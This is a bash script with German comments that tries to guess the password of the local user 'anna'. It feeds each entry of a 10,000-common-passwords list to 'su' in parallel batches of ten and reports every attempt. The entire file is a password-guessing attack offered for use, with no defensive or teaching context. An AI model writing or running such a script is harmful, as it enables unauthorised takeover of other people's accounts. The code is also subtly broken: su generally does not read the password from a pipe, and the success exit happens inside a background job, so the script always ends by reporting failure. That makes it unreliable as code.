#!/bin/bash

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path="./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username="anna"

# Funktion, um Passwörter zu testen
check_password() {
    local password="$1"
    su - "$username" -c "whoami" <<< "$password" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
        exit 0
    else
        echo "Fehler beim Anmelden als '$username' mit dem Passwort '$password'"
    fi
}

# Starte die Überprüfung der Passwörter
while IFS= read -r password; do
    check_password "$password" &
    # Begrenze die Anzahl der gleichzeitigen Subprozesse auf 10
    if [ $(jobs | wc -l) -ge 10 ]; then
        wait -n || true
    fi
done < "$password_list_path"

# Warte auf die Beendigung aller laufenden Subprozesse
wait

# Wenn kein gültiges Passwort gefunden wurde
echo "Kein gültiges Passwort für '$username' gefunden."
exit 1
